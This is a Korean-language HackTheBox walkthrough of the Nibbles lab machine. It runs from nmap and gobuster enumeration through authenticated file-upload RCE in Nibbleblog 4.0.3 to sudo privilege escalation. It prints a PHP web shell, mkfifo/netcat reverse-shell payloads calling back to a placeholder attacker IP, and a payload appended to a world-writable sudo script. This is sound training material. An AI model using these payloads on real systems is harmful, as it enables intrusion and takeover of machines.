# Nibbles - HackTheBox Writeup

**Machine:** Nibbles  
**IP:** 10.10.10.75  
**OS:** Linux  
**Difficulty:** Easy

---

## 1. Recon

### Nmap

초기 스캔 (빠르게 상위 포트 확인)

nmap -sC -sV -oA nmap/initial 10.10.10.75

예상 결과:

22/tcp open  ssh     OpenSSH ...  
80/tcp open  http    Apache httpd ...

> 포트가 22(SSH), 80(HTTP)만 열려 있으므로 웹에서 foothold를 찾는 흐름이 자연스럽다.

---

## 2. Web Enumeration (Port 80)

### Web root 확인

브라우저로 `http://10.10.10.75/` 접속하면 “Hello world”류의 심플한 페이지가 나온다.  
**페이지 소스(view-source)** 를 확인하면 다음 힌트가 있다:

<!-- /nibbleblog/ directory. Nothing interesting here! -->

따라서 다음 경로로 이동:

http://10.10.10.75/nibbleblog/

Nibbleblog 인스턴스가 확인된다.

---

## 3. Directory Enumeration

### gobuster (php/txt)

gobuster dir -u http://10.10.10.75/nibbleblog/ \  
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \  
  -t 30 -x php,txt

예시로 자주 보이는 결과:

/admin.php  
/admin/  
/content/  
/plugins/  
/README  
/install.php  
/update.php  
...

---

## 4. Username Discovery

`/content` 쪽에 디렉토리 리스팅이 켜져 있는 경우가 많다.

다음 파일에서 사용자 정보를 확인:

http://10.10.10.75/nibbleblog/content/private/users.xml

여기서 보통 다음과 같이 `admin` 유저를 얻는다:

<user username="admin">

---

## 5. Admin Panel Login

관리자 패널:

http://10.10.10.75/nibbleblog/admin.php

- Username: `admin`
    
- Password: (CTF라면 보통 **추측/브루트포스/힌트 기반**)
    

워크스루 기준으론 `nibbles`가 맞았지만, 네 환경에서는 실제로 로그인 성공한 값으로 기록하면 됨.

✅ 로그인 성공 후, `README`에서 버전 확인:

http://10.10.10.75/nibbleblog/README

예시:

Version: v4.0.3

---

## 6. RCE (Authenticated File Upload)

Nibbleblog 4.0.3은 **인증 후 업로드 기반 RCE**가 가능하다 (CVE-2015-6967).

### (A) Metasploit로 할 경우 (옵션)

msfconsole  
use exploit/multi/http/nibbleblog_file_upload  
set RHOSTS 10.10.10.75  
set TARGETURI /nibbleblog/  
set USERNAME admin  
set PASSWORD <your_password>  
set LHOST <your_tun0_ip>  
set LPORT 4444  
run

> HTB에서 MSF 사용 제한이 있는 경우가 많으니, 보통은 아래 수동 방식이 더 좋다.

---

### (B) 수동 exploit (추천)

#### 1) My Image 플러그인 활성화

관리자 페이지에서:

- **Plugins** 메뉴
    
- **My image** 플러그인 선택
    
- `Configure` 들어가면 업로드 폼이 나온다.
    

#### 2) 웹쉘 업로드

간단한 커맨드 실행용 PHP:

<?php system($_REQUEST['cmd']); ?>

파일명 예시: `cmd.php`

업로드 후, 플러그인 폴더에 `image.php` 같은 이름으로 저장되는 경우가 많다.

접근 예시:

http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id

#### 3) 리버스 쉘로 안정화

세션이 자주 끊기거나 다른 사람이 덮어쓰는 경우가 많아서 **리버스쉘**로 바꾸는 게 안정적이다.

Kali 리스너:

nc -lvnp 8082

리버스쉘 PHP (네 IP로 수정):

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_TUN0_IP> 8082 >/tmp/f"); ?>

업로드 후 해당 파일 호출하면 연결됨.

연결 확인:

id  
# uid=1001(nibbler) ...

---

## 7. User Flag

유저 홈 확인:

cd /home  
ls  
cd nibbler  
ls -la  
cat user.txt

✅ `user.txt` 값을 기록.

---

## 8. Privilege Escalation (sudo -l)

현재 계정에서 sudo 권한 확인:

sudo -l

Nibbles에서 전형적으로 나오는 결과:

( root ) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

즉, `monitor.sh`를 **비밀번호 없이 root로 실행 가능**.

---

## 9. PrivEsc: world-writable script abuse

해당 스크립트 권한 확인:

ls -l /home/nibbler/personal/stuff/monitor.sh

보통 이런 형태:

-rwxrwxrwx 1 nibbler nibbler ... monitor.sh

즉, **world-writable**.

### 방법 1: 간단 루트 쉘

(가장 빠른 방식)

echo 'bash -p' >> /home/nibbler/personal/stuff/monitor.sh  
sudo /home/nibbler/personal/stuff/monitor.sh

root 확인:

id  
# uid=0(root)

> `bash -p`는 권한 유지 옵션이라 상황에 따라 매우 편함.

### 방법 2: 리버스 쉘로 root 받기

Kali에서 리스너:

nc -lvnp 8083

스크립트 마지막 줄에 추가 (네 IP로 수정):

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_TUN0_IP> 8083 >/tmp/f" >> /home/nibbler/personal/stuff/monitor.sh  
sudo /home/nibbler/personal/stuff/monitor.sh

---

## 10. Root Flag

root shell에서:

cd /root  
cat root.txt

✅ `root.txt` 값 기록.

---

# Attack Chain Summary

nmap → web(80)  
→ /nibbleblog 발견  
→ users.xml로 admin 유저 확인  
→ admin panel 로그인  
→ My image plugin upload → RCE  
→ www-data/nibbler 쉘 획득  
→ sudo -l로 monitor.sh NOPASSWD 확인  
→ world-writable monitor.sh에 payload 추가  
→ sudo 실행 → root  
→ root.txt 획득

---

# Key Takeaways

- **웹 소스 주석**에 다음 경로 힌트가 숨겨져 있을 수 있음.
    
- **Directory listing / users.xml** 같은 파일이 username을 노출할 수 있음.
    
- **Authenticated file upload**는 “로그인만 되면” 곧바로 RCE로 이어지는 대표 취약점.
    
- `sudo -l`은 리눅스 privesc의 시작점.  
    특히 **NOPASSWD + writable script** 조합은 거의 즉시 root로 이어짐.
    

---

# Tools Used

- nmap
    
- gobuster / feroxbuster
    
- netcat
    
- (optional) metasploit
    
- basic linux privesc (`sudo -l`, file permission checks)